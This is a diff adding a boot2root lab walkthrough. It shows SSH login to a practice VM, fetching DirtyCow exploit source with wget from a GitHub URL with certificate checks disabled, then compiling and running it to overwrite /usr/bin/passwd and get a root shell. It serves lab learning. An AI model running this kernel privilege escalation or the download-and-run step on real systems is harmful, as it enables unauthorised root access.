@@ -1,0 +1,61 @@
+After we've logged into a user on the VM we can exploit a race condition in the kernel to create a binary which will spawn a root shell for us. 
+
+First we need to get the program source code. 
+
+```console
+kali@kali:~$ ssh laurie@192.168.178.62
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.178.62's password:
+laurie@BornToSecHackMe:~$ wget --no-check-certificate https://raw.githubusercontent.com/Madasanya/boot2root/main/scripts/cow.c
+--2023-02-02 19:07:58--  https://raw.githubusercontent.com/Madasanya/boot2root/main/scripts/cow.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8000::154, 2606:50c0:8001::154, 2606:50c0:8002::154, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8000::154|:443... connected.
+WARNING: no certificate subject alternative name matches
+	requested host name `raw.githubusercontent.com'.
+HTTP request sent, awaiting response... 200 OK
+Length: 2584 (2.5K) [text/plain]
+Saving to: `cow.c'
+
+100%[=====================================================================================================>] 2,584       --.-K/s   in 0s
+
+2023-02-02 19:07:59 (103 MB/s) - `cow.c' saved [2584/2584]
+```
+
+Now we can compile our program. 
+
+```console
+laurie@BornToSecHackMe:~$ gcc -pthread cow.c -o cow
+cow.c: In function 'main':
+cow.c:63:3: warning: format '%x' expects argument of type 'unsigned int', but argument 2 has type 'void *' [-Wformat]
+```
+
+And run it. 
+
+```console
+laurie@BornToSecHackMe:~$ ./cow
+
+   (___)
+   (o o)_____/
+    @@ `     \
+     \ ____, //usr/bin/passwd
+     //    //
+    ^^    ^^
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap b7e04000
+```
+
+This creates us a binary that will spawn a root shell on the current user!
+
+```console
+laurie@BornToSecHackMe:~$ /usr/bin/passwd
+root@BornToSecHackMe:/home/laurie# whoami
+root
+```
